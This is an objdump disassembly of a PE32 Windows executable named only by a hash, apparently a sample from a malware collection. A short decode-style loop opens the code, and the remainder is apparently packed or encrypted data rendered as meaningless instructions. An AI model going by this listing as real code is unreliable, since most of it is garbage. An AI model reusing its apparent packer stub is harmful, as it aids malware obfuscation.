
7af42dd9d325cfa006185cf21191d611ee65e9bdbebcda1668be196e99ca8961.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	push   ecx
  411001:	push   ebp
  411002:	mov    ebp,DWORD PTR [esp+0x10]
  411006:	xor    eax,eax
  411008:	test   ebp,ebp
  41100a:	push   esi
  41100b:	mov    DWORD PTR [esp+0x8],eax
  41100f:	mov    esi,0xfffffffd
  411014:	je     0x41107a
  411016:	push   ebx
  411017:	push   edi
  411018:	mov    edi,DWORD PTR [esp+0x18]
  41101c:	mov    DWORD PTR [esp+0x1c],0x1
  411024:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  411028:	add    esi,0x2
  41102b:	inc    esi
  41102c:	mov    BYTE PTR [esi+edi*1],cl
  41102f:	mov    ecx,DWORD PTR [esp+0x24]
  411033:	movzx  ecx,BYTE PTR [eax+ecx*1]
  411037:	mov    edx,DWORD PTR [esp+0x10]
  41103b:	mov    eax,DWORD PTR [esp+0x1c]
  41103f:	add    edx,eax
  411041:	mov    DWORD PTR [esp+0x10],edx
  411045:	ror    eax,cl
  411047:	mov    eax,DWORD PTR [esp+0x10]
  41104b:	mov    edx,eax
  41104d:	shr    edx,0x3
  411050:	mov    ebx,0x1
  411055:	sub    ebx,edx
  411057:	imul   eax,ebx
  41105a:	mov    DWORD PTR [esp+0x10],eax
  41105e:	shl    ebx,0x3
  411061:	mov    bl,BYTE PTR [esi+edi*1]
  411064:	add    bl,cl
  411066:	mov    ecx,DWORD PTR [esp+0x20]
  41106a:	mov    BYTE PTR [esi+edi*1],bl
  41106d:	sub    esi,0x2
  411070:	cmp    esi,ecx
  411072:	jl     0x411024
  411074:	pop    edi
  411075:	pop    ebx
  411076:	pop    esi
  411077:	pop    ebp
  411078:	pop    ecx
  411079:	ret    
  41107a:	mov    eax,ds:0xda03619e
  41107f:	xchg   esp,eax
  411080:	xchg   ebx,eax
  411081:	jno    0x411061
  411083:	dec    ebx
  411084:	cwde   
  411085:	sub    al,0xd6
  411087:	cmp    esp,edi
  411089:	mov    dl,BYTE PTR [edi+0x53b59235]
  41108f:	sbb    eax,0x1500ff42
  411094:	or     esi,DWORD PTR [edx-0x3a9b6cb0]
  41109a:	pop    ebp
  41109b:	mov    al,ds:0x37ebc688
  4110a0:	ret    
  4110a1:	inc    edi
  4110a2:	aaa    
  4110a3:	sbb    al,0x19
  4110a5:	mov    dh,0x17
  4110a7:	jmp    0x411053
  4110a9:	in     eax,dx
  4110aa:	xlat   BYTE PTR ds:[ebx]
  4110ab:	fs mov dl,0x65
  4110ae:	add    al,0x1
  4110b0:	enter  0x9c29,0x29
  4110b4:	das    
  4110b5:	ds inc ebx
  4110b7:	fisttp WORD PTR [esi-0xdf70a35]
  4110bd:	jb     0x4110f2
  4110bf:	xor    al,0x39
  4110c1:	scas   eax,DWORD PTR es:[edi]
  4110c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110c3:	js     0x411048
  4110c5:	jb     0x4110c1
  4110c7:	loope  0x4110fe
  4110c9:	mov    WORD PTR ds:0x8621f49e,ds
  4110cf:	mov    dh,0x3f
  4110d1:	rol    dh,1
  4110d3:	div    DWORD PTR [edi+0x63307b86]
  4110d9:	jo     0x41114d
  4110db:	sbb    al,0x5e
  4110dd:	les    ecx,FWORD PTR [ebp+0x0]
  4110e0:	cmp    BYTE PTR [edx],ch
  4110e2:	rol    BYTE PTR [ebx-0x7b],0xe1
  4110e6:	sub    edx,0xffffffe1
  4110e9:	sar    BYTE PTR [ecx+ebp*1+0x6331fc11],1
  4110f0:	sbb    dh,BYTE PTR [edx]
  4110f2:	pop    edx
  4110f3:	add    esi,DWORD PTR [esi-0x1068d5e3]
  4110f9:	jecxz  0x4110ec
  4110fb:	jne    0x41110b
  4110fd:	(bad)  
  4110fe:	out    0x56,al
  411100:	mov    eax,0x16520968
  411105:	mov    eax,0x344ec38a
  41110a:	xchg   ebx,eax
  41110b:	and    dh,BYTE PTR [edx+0x46]
  41110e:	jo     0x411167
  411110:	xchg   esi,eax
  411111:	mov    dh,0x57
  411113:	sbb    al,0x1c
  411115:	jns    0x411101
  411117:	imul   esi,DWORD PTR ds:0x3a8b8b48,0x17
  41111e:	popf   
  41111f:	ror    DWORD PTR [edi+0x51930750],0x3a
  411126:	add    cl,BYTE PTR [edx+0x1d]
  411129:	sbb    DWORD PTR [ebx-0x43],0x6e
  41112d:	cwde   
  41112e:	pop    ecx
  41112f:	and    BYTE PTR [ebp-0x3],dh
  411132:	add    DWORD PTR [edx+0x54],0xe6245ac5
  411139:	leave  
  41113a:	mov    edx,0xf8a23fa
  41113f:	mov    esp,0xcd05ea9d
  411144:	adc    bh,dh
  411146:	js     0x4111b4
  411148:	rcr    dh,1
  41114a:	test   al,0x12
  41114c:	mov    ebp,0x824a4d90
  411151:	push   eax
  411152:	stos   DWORD PTR es:[edi],eax
  411153:	pop    edi
  411154:	xchg   esi,eax
  411155:	mov    WORD PTR [edx-0x3906e93b],ss
  41115b:	jnp    0x411155
  41115d:	enter  0x2424,0x31
  411161:	bound  ebx,QWORD PTR [ebx+0x56bf5912]
  411167:	loop   0x4111a8
  411169:	aas    
  41116a:	inc    eax
  41116b:	xor    al,0x94
  41116d:	jb     0x41114c
  41116f:	jmp    0x41117f
  411171:	push   es
  411172:	add    edx,edi
  411174:	ja     0x411121
  411176:	push   ecx
  411177:	lahf   
  411178:	test   BYTE PTR ds:0xc56a5482,dh
  41117e:	mov    fs,edx
  411180:	push   eax
  411181:	inc    ecx
  411182:	ror    BYTE PTR [esi],0x6a
  411185:	mov    edx,ss
  411187:	hlt    
  411188:	adc    dh,BYTE PTR [edx]
  41118a:	adc    BYTE PTR [ebx+0x2e],dh
  41118d:	add    DWORD PTR [bx+si-0x4d1a],0xc9dda71b
  411196:	cmp    DWORD PTR [ecx+0x1],esp
  411199:	mov    esi,DWORD PTR [edx+edi*8+0x7b8f2de4]
  4111a0:	fstp   TBYTE PTR [esi+0x0]
  4111a3:	sti    
  4111a4:	jns    0x4111e3
  4111a6:	fs jno 0x411219
  4111a9:	loop   0x41121f
  4111ab:	mov    ah,0x1e
  4111ad:	jb     0x4111a1
  4111af:	xlat   BYTE PTR ds:[ebx]
  4111b0:	scas   al,BYTE PTR es:[edi]
  4111b1:	push   ebp
  4111b2:	sahf   
  4111b3:	or     ebp,DWORD PTR [eax+edx*8-0x10]
  4111b7:	iret   
  4111b8:	jecxz  0x41118b
  4111ba:	in     al,0x5d
  4111bc:	mov    esp,0x18d800c2
  4111c1:	jb     0x411163
  4111c3:	jae    0x4111c8
  4111c5:	aaa    
  4111c6:	jle    0x4111b9
  4111c8:	mov    WORD PTR [ebp+0x4741e25],?
  4111ce:	dec    ebp
  4111cf:	popa   
  4111d0:	(bad)  
  4111d1:	repnz cmp dl,BYTE PTR [eax]
  4111d4:	add    eax,ecx
  4111d6:	xor    ah,dh
  4111d8:	mov    WORD PTR [ebx],es
  4111da:	aad    0xd
  4111dc:	and    esp,DWORD PTR [ecx-0x1f]
  4111df:	xchg   esi,eax
  4111e0:	lock ds mov edx,0xd0753469
  4111e7:	adc    al,BYTE PTR [ebx+edx*2+0x9]
  4111eb:	(bad)  
  4111ec:	hlt    
  4111ed:	xor    bl,bl
  4111ef:	not    BYTE PTR [edi]
  4111f1:	mov    ds:0xdd886d2e,eax
  4111f6:	add    DWORD PTR [ecx-0x6],edi
  4111f9:	cld    
  4111fa:	ficomp WORD PTR [ebp+0x789b3f5b]
  411200:	push   esi
  411201:	push   cs
  411202:	sbb    DWORD PTR [edx],edi
  411204:	imul   BYTE PTR [ecx-0x720d6f1e]
  41120a:	push   DWORD PTR [ebx+0x1]
  41120d:	mov    ?,WORD PTR ds:0x66d1ce3f
  411213:	mov    dh,0x37
  411215:	fwait
  411216:	dec    eax
  411217:	xor    al,0xa1
  411219:	push   esp
  41121a:	sub    BYTE PTR ds:0xd7931b77,ch
  411220:	mov    edi,0x5d250fe0
  411225:	int    0x2b
  411227:	out    dx,eax
  411228:	sub    dl,BYTE PTR [eax]
  41122a:	mov    bl,0x37
  41122c:	shr    BYTE PTR [eax-0x2b],cl
  41122f:	shr    BYTE PTR [ecx+ebx*2+0x61bb0f93],cl
  411236:	int    0x30
  411238:	sbb    al,0x80
  41123a:	ins    DWORD PTR es:[edi],dx
  41123b:	push   ss
  41123c:	jb     0x4111ce
  41123e:	jle    0x41124e
  411240:	fist   DWORD PTR [esi-0x6e]
  411243:	dec    ebp
  411244:	in     eax,0x4c
  411246:	cld    
  411247:	mov    ebp,0x67491efe
  41124c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41124d:	push   edx
  41124f:	ret    0x80f7
  411252:	fcom   DWORD PTR [edi+ecx*8-0x18]
  411256:	dec    ecx
  411257:	push   eax
  411258:	xchg   esp,eax
  411259:	cli    
  41125a:	push   edx
  41125b:	shl    DWORD PTR [eax],0xcc
  41125e:	hlt    
  41125f:	or     al,0x5
  411261:	sub    eax,DWORD PTR [ebx+eiz*2]
  411264:	fidivr WORD PTR [edi+0x57]
  411267:	mov    cl,0xd6
  411269:	jo     0x411247
  41126b:	sub    eax,0xfceb3c47
  411270:	cmp    BYTE PTR [ebx+ebx*1+0x25],cl
  411274:	sti    
  411275:	xor    ecx,DWORD PTR [edi-0x21f6071]
  41127b:	in     eax,0x89
  41127d:	outs   dx,DWORD PTR ds:[esi]
  41127e:	je     0x41126d
  411280:	sub    al,0xb0
  411282:	jle    0x411236
  411284:	inc    ebp
  411285:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411286:	mov    ebx,0x7279aaf9
  41128b:	adc    eax,0xb32727de
  411290:	pop    esp
  411291:	jbe    0x411247
  411293:	xchg   ecx,eax
  411294:	test   al,0x1c
  411296:	xchg   esp,eax
  411297:	mul    BYTE PTR [ecx+0x11916bd2]
  41129d:	jge    0x411314
  41129f:	dec    esp
  4112a0:	cld    
  4112a1:	push   edi
  4112a2:	mov    ds:0x73c94edf,al
  4112a7:	or     al,0x3a
  4112a9:	pop    ds
  4112aa:	xor    al,0x2
  4112ac:	sub    eax,0x47720175
  4112b1:	(bad)  
  4112b2:	xchg   DWORD PTR [eax],esi
  4112b4:	and    ebp,esp
  4112b6:	xor    bl,dl
  4112b8:	mul    BYTE PTR [edi+0x412ca56]
  4112be:	xor    ebx,DWORD PTR [edi]
  4112c0:	cmp    al,0xcc
  4112c2:	jmp    0x41133c
  4112c4:	int3   
  4112c5:	fst    QWORD PTR [ebx+0x56]
  4112c8:	in     eax,dx
  4112c9:	lea    ebp,[ebx-0x2833884d]
  4112cf:	enterw 0x6fed,0x6
  4112d4:	pop    ss
  4112d5:	ret    0x8770
  4112d8:	imul   esi,edx,0xb22756a9
  4112de:	adc    DWORD PTR [ecx],edx
  4112e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112e1:	sahf   
  4112e2:	mov    bh,0x32
  4112e4:	inc    ecx
  4112e5:	and    ch,bl
  4112e7:	je     0x411287
  4112e9:	leave  
  4112ea:	push   0xffffff89
  4112ec:	ret    
  4112ed:	sbb    dl,BYTE PTR [edx-0x80]
  4112f0:	mov    dh,0xfb
  4112f2:	imul   esp,DWORD PTR [ecx],0xb0697559
  4112f8:	imul   edi,DWORD PTR [edi+0x3d],0x7b
  4112fc:	sbb    cl,BYTE PTR [esi-0x645b1e49]
  411302:	enter  0xdc8b,0x2
  411306:	sub    al,BYTE PTR [edi-0x7]
  411309:	jp     0x41130d
  41130b:	mov    bh,0xfc
  41130d:	jl     0x41133e
  41130f:	test   al,0x71
  411311:	push   0x6af4de
  411316:	call   0xd3d24032
  41131b:	xlat   BYTE PTR ds:[ebx]
  41131c:	pop    eax
  41131d:	mov    cs,WORD PTR [edi+0x4c05f5b8]
  411323:	xchg   edx,eax
  411324:	push   edx
  411325:	mov    esi,0x6217d2d3
  41132a:	sti    
  41132b:	call   0xbf2e7837
  411330:	iret   
  411331:	and    eax,0x5ad7e465
  411336:	pop    eax
  411337:	mov    eax,ds:0x941f1b84
  41133c:	xchg   esp,eax
  41133d:	jmp    0x41132a
  41133f:	mov    ah,0xcf
  411341:	fstp   TBYTE PTR [eax-0x1]
  411344:	or     eax,0xd7ab41b
  411349:	(bad)  
  41134a:	cmp    BYTE PTR [ecx],ch
  41134c:	out    dx,eax
  41134d:	adc    BYTE PTR [edi],cl
  41134f:	xchg   ebx,eax
  411350:	inc    ebx
  411351:	mov    DWORD PTR [edi-0x5c],esp
  411354:	adc    DWORD PTR [ebp+0x3b462f0d],eax
  41135a:	in     al,0x17
  41135c:	mov    cl,0x79
  41135e:	(bad)  
  41135f:	mov    esi,0xe8e96b7b
  411364:	add    edi,esi
  411366:	repnz xchg dx,ax
  411369:	pop    eax
  41136a:	leave  
  41136b:	mov    ecx,0xaa0ad665
  411370:	and    DWORD PTR [ebx+0x6985781d],ebx
  411376:	or     DWORD PTR [edx],edx
  411378:	dec    esp
  411379:	inc    edi
  41137a:	cmp    DWORD PTR [edx+0x24],ebx
  41137d:	sahf   
  41137e:	jo     0x41138a
  411380:	repnz idiv dh
  411383:	jmp    0xf201db4c
  411388:	push   ebx
  411389:	(bad)  
  41138b:	or     dh,dl
  41138d:	imul   ebx,esp,0x42cf09f4
  411393:	pop    ebx
  411394:	mov    bh,0x89
  411396:	push   eax
  411397:	aaa    
  411398:	retf   
  411399:	out    dx,eax
  41139a:	test   eax,0x5e8d51a4
  41139f:	mov    ebp,0xf3a0c684
  4113a4:	xor    ebx,DWORD PTR [eax+ecx*4-0x5bde2452]
  4113ab:	lods   al,BYTE PTR ds:[esi]
  4113ac:	out    0x70,eax
  4113ae:	fwait
  4113af:	jmp    0x41136d
  4113b1:	xor    DWORD PTR [edx+0x51],ebp
  4113b4:	sbb    al,0x7a
  4113b6:	rcl    BYTE PTR [edx+0x5b786232],0xba
  4113bd:	test   al,al
  4113bf:	(bad)  
  4113c0:	into   
  4113c1:	push   ds
  4113c2:	and    al,0xc2
  4113c4:	test   bh,bl
  4113c6:	cwde   
  4113c7:	in     al,dx
  4113c8:	xor    ebp,ecx
  4113ca:	bound  edi,QWORD PTR [esi]
  4113cc:	sbb    DWORD PTR [edi-0x52],0x6e
  4113d0:	or     eax,0x5b4e3208
  4113d5:	repz xor bh,BYTE PTR [edi]
  4113d8:	jno    0x4113cf
  4113da:	inc    esi
  4113db:	mov    esi,0x8c8e2f24
  4113e0:	sbb    bh,dl
  4113e2:	outs   dx,BYTE PTR ds:[esi]
  4113e3:	add    ch,BYTE PTR [eax-0x4]
  4113e6:	mov    ah,0x3c
  4113e8:	jmp    0x31503e29
  4113ed:	jae    0x4113dc
  4113ef:	push   esp
  4113f0:	dec    edx
  4113f2:	mov    esi,0x98f5c123
  4113f7:	fcmovnb st,st(5)
  4113f9:	aad    0x38
  4113fb:	enter  0xee9f,0x8b
  4113ff:	xor    eax,ebp
  411401:	cld    
  411402:	xchg   ecx,eax
  411403:	mov    esp,0xf7e7580e
  411408:	sbb    al,0xce
  41140a:	dec    edx
  41140b:	jno    0x41142f
  41140d:	js     0x4113f1
  41140f:	stc    
  411410:	out    0x68,al
  411412:	clc    
  411413:	or     ebx,DWORD PTR [edi-0x41]
  411416:	test   DWORD PTR [ebp+edx*4+0x18],0x3c6fdbb8
  41141e:	out    dx,eax
  41141f:	repz frstor [esi-0x310ee72e]
  411426:	inc    edx
  411427:	popf   
  411428:	mov    edi,0xd41ed347
  41142d:	test   DWORD PTR [eax],ebp
  41142f:	popa   
  411430:	cld    
  411431:	mov    al,ds:0x8401e248
  411436:	mov    al,0x18
  411438:	push   edx
  411439:	std    
  41143a:	mov    cl,0xc5
  41143c:	sbb    al,0x70
  41143e:	bound  esp,QWORD PTR [ebp+0x58e9a469]
  411444:	jne    0x411438
  411446:	ins    BYTE PTR es:[edi],dx
  411447:	add    BYTE PTR [esi+esi*1],dl
  41144a:	dec    esi
  41144b:	mov    ch,cl
  41144d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41144e:	iret   
  41144f:	push   edi
  411450:	call   0x8a5d:0x57dee886
  411457:	mov    ebp,0x31d9c49a
  41145c:	dec    edi
  41145d:	inc    edx
  41145e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41145f:	and    DWORD PTR [edi],0x3a847db4
  411465:	pop    es
  411466:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411467:	pop    es
  411468:	(bad)  
  411469:	mov    WORD PTR [ebp-0x58],?
  41146c:	adc    esi,eax
  41146e:	mov    al,ds:0x7ae0ab56
  411473:	(bad)  
  411474:	out    dx,al
  411475:	fist   WORD PTR [edx+0x6e]
  411478:	and    BYTE PTR [eax+0x29],cl
  41147b:	fdivr  QWORD PTR [edx-0x7d2b7e95]
  411481:	ss sbb eax,0x3093f5a8
  411487:	adc    BYTE PTR [edi+ebx*2],0xe3
  41148b:	lea    esp,[ecx+edi*8-0x5d8fbc1f]
  411492:	lods   eax,DWORD PTR ds:[esi]
  411493:	and    al,0x6f
  411495:	push   ebp
  411496:	push   edi
  411497:	daa    
  411498:	jge    0x41144f
  41149a:	outs   dx,BYTE PTR ds:[esi]
  41149b:	(bad)  [ecx+0x1c]
  41149e:	loopne 0x4114ba
  4114a0:	fldcw  WORD PTR [ecx+0x6c]
  4114a3:	out    0x3d,eax
  4114a5:	mov    WORD PTR [ecx+0x67fdcee5],ds
  4114ab:	sbb    eax,0x533486d7
  4114b0:	sbb    DWORD PTR [edi-0x73782bde],ebp
  4114b6:	loopne 0x411487
  4114b8:	imul   ebp,DWORD PTR [eax],0x24
  4114bb:	pop    eax
  4114bc:	jno    0x41148b
  4114be:	(bad)  
  4114c0:	pop    ds
  4114c1:	jns    0x4114e0
  4114c3:	call   0xf284:0xccc8cfa6
  4114ca:	xlat   BYTE PTR fs:[ebx]
  4114cc:	dec    esp
  4114cd:	cmp    ah,dl
  4114cf:	sbb    al,0x15
  4114d1:	sbb    DWORD PTR [edi-0x215e85e],0x2eb2da47
  4114db:	cdq    
  4114dc:	inc    ebx
  4114dd:	adc    DWORD PTR [esi],ecx
  4114df:	inc    DWORD PTR ds:0x60c279eb
  4114e6:	mov    ebx,0x6f18aba4
  4114eb:	jo     0x4114bf
  4114ed:	cwde   
  4114ee:	sub    eax,0x34b9cc03
  4114f3:	push   DWORD PTR [esi+eiz*4-0x667b3095]
  4114fa:	(bad)  
  4114fb:	sti    
  4114fc:	cs ret 0x5754
  411500:	cmc    
  411501:	and    dl,BYTE PTR [eax-0x3e]
  411504:	push   eax
  411505:	inc    ebp
  411506:	shr    DWORD PTR [edx-0x46c6ec4e],0x1c
  41150d:	xchg   ebx,eax
  41150e:	adc    al,0x3d
  411510:	pop    edx
  411511:	ret    
  411512:	out    dx,al
  411513:	hlt    
  411514:	(bad)  [edi+esi*1-0x3cfb42a4]
  41151b:	jbe    0x41151e
  41151d:	sti    
  41151e:	sub    DWORD PTR [esi+ebp*8],ebp
  411521:	mov    dh,0xa0
  411523:	mov    ah,BYTE PTR [ecx+0x6c]
  411526:	mov    eax,ebp
  411528:	xor    edi,DWORD PTR [ebx+0x3b3364f8]
  41152e:	ds or  al,0xd1
  411531:	sub    al,0xa5
  411533:	out    dx,eax
  411534:	inc    edx
  411535:	mov    WORD PTR [eax-0x1454b0c8],cs
  41153b:	jmp    0x4115aa
  41153d:	lods   eax,DWORD PTR ds:[esi]
  41153e:	imul   esi,esp,0xffffff8a
  411541:	inc    esp
  411542:	sbb    bl,BYTE PTR [ebp-0x7d]
  411545:	and    DWORD PTR [ebx-0x22a734fa],ecx
  41154b:	loope  0x411560
  41154d:	xchg   esp,eax
  41154e:	mov    al,ds:0xd67c2c43
  411553:	adc    BYTE PTR [ecx],dl
  411555:	add    eax,0xa385fef5
  41155a:	shl    BYTE PTR [ebx+0x7f],cl
  41155d:	fmul   st(0),st
  41155f:	and    eax,0x7c62f813
  411564:	mov    esp,0x8f56c53f
  411569:	add    BYTE PTR [edx],0x6f
  41156c:	cmp    eax,0xffcd5029
  411571:	aaa    
  411572:	jb     0x411508
  411574:	xchg   ebx,eax
  411575:	call   0xbbb7:0x1962f695
  41157c:	inc    ebp
  41157d:	sub    ecx,DWORD PTR [ebp-0x3f]
  411580:	fmulp  st(2),st
  411582:	sub    BYTE PTR [edx],bl
  411584:	jbe    0x4115f1
  411586:	je     0x41151c
  411588:	or     al,0x2c
  41158a:	loopne 0x411549
  41158c:	sub    al,0x24
  41158e:	clc    
  41158f:	in     al,0xd9
  411591:	or     ebp,DWORD PTR [ebp+0x27]
  411594:	or     eax,DWORD PTR [ebx+0x33]
  411597:	xchg   ebx,eax
  411598:	push   ebx
  411599:	outs   dx,DWORD PTR ds:[esi]
  41159a:	xlat   BYTE PTR ds:[bx]
  41159c:	inc    edi
  41159d:	pushf  
  41159e:	or     al,0x3d
  4115a0:	sub    eax,0x83650387
  4115a6:	sub    al,0x8f
  4115a8:	dec    edi
  4115a9:	loope  0x41156c
  4115ab:	sbb    ecx,0x5b8e84a5
  4115b1:	or     dh,BYTE PTR [edi-0x19]
  4115b4:	inc    edx
  4115b5:	sbb    DWORD PTR [ecx+0x177a8889],eax
  4115bb:	and    esi,DWORD PTR [edx]
  4115bd:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4115bf:	test   BYTE PTR [edi+0x74],cl
  4115c2:	ret    0x7ec0
  4115c5:	inc    eax
  4115c6:	mov    cl,0xe7
  4115c8:	mov    WORD PTR [edi-0x3b6eb892],fs
  4115ce:	or     dh,BYTE PTR ds:0xcc32bd8a
  4115d4:	add    ecx,edi
  4115d6:	bound  edx,QWORD PTR [ebx+0x57]
  4115d9:	aaa    
  4115da:	ins    DWORD PTR es:[edi],dx
  4115db:	or     dh,ah
  4115dd:	stc    
  4115de:	add    eax,0x8dea9e6
  4115e3:	add    ebx,DWORD PTR [edi-0x28b64407]
  4115e9:	repz out dx,eax
  4115eb:	(bad)  
  4115ec:	xor    DWORD PTR [ebp-0x5],esi
  4115ef:	lds    ecx,FWORD PTR [esi]
  4115f1:	scas   al,BYTE PTR es:[edi]
  4115f2:	jecxz  0x41163d
  4115f4:	pop    ebx
  4115f5:	mov    esp,0x82156048
  4115fa:	out    dx,eax
  4115fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115fc:	sar    DWORD PTR [esp+ecx*8+0x46],1
  411600:	push   0x6d
  411602:	sub    BYTE PTR [ecx+ebx*2],0x2
  411606:	std    
  411607:	pop    ds
  411608:	sub    DWORD PTR [edi+ecx*4+0x2e],esi
  41160c:	add    eax,0x1349f07b
  411611:	inc    edi
  411612:	aam    0xe8
  411614:	(bad)  
  411615:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411616:	out    0xb2,al
  411618:	dec    esp
  411619:	inc    edi
  41161a:	sar    BYTE PTR [edx],0x3e
  41161d:	and    ecx,edx
  41161f:	sbb    al,0xf6
  411621:	xchg   ax,ax
  411623:	cmp    eax,0x83c2f74d
  411628:	loope  0x411692
  41162a:	rol    dl,0x70
  41162d:	dec    edx
  41162e:	or     al,0x7d
  411630:	add    al,0x74
  411632:	fcomp  QWORD PTR [edi-0x1d]
  411635:	dec    edx
  411636:	inc    ebp
  411637:	outs   dx,BYTE PTR ds:[esi]
  411638:	jnp    0x4115f7
  41163a:	push   ebp
  41163b:	popf   
  41163c:	sar    DWORD PTR [esi+0x771c5ca9],0xbe
  411643:	mov    ss,edx
  411645:	aas    
  411646:	mov    ds:0x24be5976,al
  41164b:	jmp    0xe5c6f43b
  411650:	(bad)  
  411651:	mov    ds:0x9e3f3c95,eax
  411656:	(bad)  
  411657:	adc    al,0xa2
  411659:	bnd jle 0x411606
  41165c:	daa    
  41165d:	add    BYTE PTR [esi+0xecfa45],0xa2
  411664:	jmp    0xc0c30859
  411669:	lds    esi,FWORD PTR [ebx+0x2fd05efe]
  41166f:	mov    dh,0x56
  411671:	sub    al,0xff
  411673:	push   0xe80b8d79
  411678:	or     DWORD PTR ds:0x57db81b4,ebp
  41167e:	pop    esi
  41167f:	call   0xb3fb:0x648b64e8
  411686:	inc    edi
  411687:	std    
  411688:	enter  0xcfd7,0xad
  41168c:	mov    dl,0x75
  41168e:	sti    
  41168f:	mov    WORD PTR [eax+0x13675747],cs
  411695:	arpl   dx,si
  411697:	ret    
  411698:	add    ah,BYTE PTR [ecx+0x3]
  41169b:	lock in eax,0x3e
  41169e:	jb     0x411717
  4116a0:	xchg   edi,ecx
  4116a2:	aas    
  4116a3:	mov    dh,0x8a
  4116a5:	mov    bl,0x80
  4116a7:	pop    esi
  4116a8:	xor    al,0x66
  4116aa:	std    
  4116ab:	cmp    eax,0x2ea9e715
  4116b0:	push   es
  4116b1:	mov    edi,0x468ceac8
  4116b6:	imul   DWORD PTR [eax]
  4116b8:	sub    edx,DWORD PTR [ebp-0x2737143d]
  4116be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116bf:	jno    0x4116d2
  4116c1:	inc    DWORD PTR [ecx]
  4116c3:	nop
  4116c4:	fiadd  DWORD PTR [ebp+ecx*2-0x79f5b32b]
  4116cb:	jns    0x411703
  4116cd:	call   0x26dcf5ca
  4116d2:	sti    
  4116d3:	pop    ecx
  4116d4:	sahf   
  4116d5:	mov    ecx,0x8e2175d9
  4116da:	fimul  DWORD PTR [ebp-0x51]
  4116dd:	cmp    BYTE PTR [eax+edx*4],bh
  4116e0:	addr16 loope 0x4116a9
  4116e3:	(bad)  
  4116e4:	jns    0x4116e7
  4116e6:	loope  0x4116bf
  4116e8:	jo     0x411747
  4116ea:	pop    edx
  4116eb:	ror    BYTE PTR [esi+0xe],cl
  4116ee:	mov    ebx,0xf6b4d80d
  4116f3:	add    eax,DWORD PTR [eax-0x4674f169]
  4116f9:	cmc    
  4116fa:	or     eax,0x420b1ae2
  4116ff:	sbb    BYTE PTR [eax+0x3026c243],0x65
  411706:	xor    BYTE PTR [edi],bl
  411708:	and    ecx,ebp
  41170a:	mov    dh,0x24
  41170c:	xchg   ecx,eax
  41170d:	dec    edx
  41170e:	int    0x87
  411710:	mov    ds:0x3b1a8403,al
  411715:	rol    bl,cl
  411717:	dec    ebp
  411718:	out    dx,al
  411719:	jg     0x411760
  41171b:	scas   eax,DWORD PTR es:[edi]
  41171c:	pop    esi
  41171d:	pop    edi
  41171e:	sahf   
  41171f:	mov    esp,0x573cf1a6
  411724:	pop    ds
  411725:	pushf  
  411726:	xchg   esi,eax
  411727:	jg     0x4116f8
  411729:	push   esp
  41172a:	ds enter 0x9d9d,0xb8
  41172f:	clc    
  411730:	jbe    0x4116df
  411732:	push   esp
  411733:	or     bl,al
  411735:	cli    
  411736:	mov    ds:0x33f25841,eax
  41173b:	aaa    
  41173c:	xchg   BYTE PTR [ecx-0x5c851ce],ah
  411742:	cmp    BYTE PTR [esi+0x1fc049bd],dl
  411748:	and    eax,0xc7daed3e
  41174d:	pop    esi
  41174e:	xchg   BYTE PTR [edx+0xddc2905],cl
  411754:	test   DWORD PTR [ebx+0x1a],0xf7222b80
  41175b:	jns    0x4117d0
  41175d:	push   0xffffffce
  41175f:	xor    esi,DWORD PTR [edx+ebp*4+0x1cf84877]
  411766:	and    eax,0x5471285
  41176b:	shl    BYTE PTR [esi+0x34],1
  41176e:	and    eax,0xf59e2098
  411773:	xlat   BYTE PTR ds:[ebx]
  411774:	cs jmp 0x411788
  411777:	xor    DWORD PTR [edx+0x1fba7239],ebp
  41177d:	sahf   
  41177e:	jmp    0x950e:0x74d99cca
  411785:	scas   al,BYTE PTR es:[edi]
  411786:	jmp    0xa10b3701
  41178b:	pop    ss
  41178c:	out    0xd7,eax
  41178e:	vunpcklps ymm3,ymm6,ymm4
  411792:	js     0x411715
  411794:	inc    ecx
  411795:	fist   WORD PTR [ebp-0x1d]
  411798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411799:	add    ch,ch
  41179b:	jg     0x41173e
  41179d:	sub    al,0x43
  41179f:	xchg   edx,eax
  4117a0:	mov    esi,DWORD PTR [edx]
  4117a2:	fs inc eax
  4117a4:	mov    dh,0x4b
  4117a6:	call   0x8e6e:0x6d9b69ec
  4117ad:	adc    al,0xc1
  4117af:	das    
  4117b0:	push   edi
  4117b1:	fdiv   DWORD PTR [edi-0x498da908]
  4117b7:	pop    edi
  4117b8:	cwde   
  4117b9:	into   
  4117ba:	pop    ebx
  4117bb:	sbb    eax,0x7fb4214c
  4117c0:	cli    
  4117c1:	dec    cl
  4117c3:	push   ecx
  4117c4:	xchg   ecx,eax
  4117c5:	sub    al,0xa4
  4117c7:	adc    edx,DWORD PTR [edi+0xf04a477]
  4117cd:	ins    BYTE PTR es:[edi],dx
  4117ce:	jp     0x4117b4
  4117d0:	jle    0x411780
  4117d2:	out    0xdc,eax
  4117d4:	aas    
  4117d5:	sub    esp,DWORD PTR [ebx+0x238e3625]
  4117db:	push   ss
  4117dc:	data16 mov cl,0xb3
  4117df:	and    DWORD PTR [esi-0x2d],eax
  4117e2:	sar    DWORD PTR [eax+0x6a],cl
  4117e5:	mov    ?,edi
  4117e7:	jno    0x4117d7
  4117e9:	inc    ebx
  4117ea:	lea    edi,[ecx]
  4117ec:	out    dx,al
  4117ed:	hlt    
  4117ee:	fst    st(2)
  4117f0:	(bad)  cs:[ecx+ebp*2-0x85f10eb]
  4117f8:	call   0xeceaabd
  4117fd:	jp     0x4117b6
  4117ff:	and    DWORD PTR [edx-0xa0996f1],edi
  411805:	mov    ah,0x95
  411807:	je     0x4117d1
  411809:	xor    DWORD PTR [ebp-0x4b],esp
  41180c:	xchg   ebx,eax
  41180d:	outs   dx,DWORD PTR ds:[esi]
  41180e:	push   eax
  41180f:	ret    
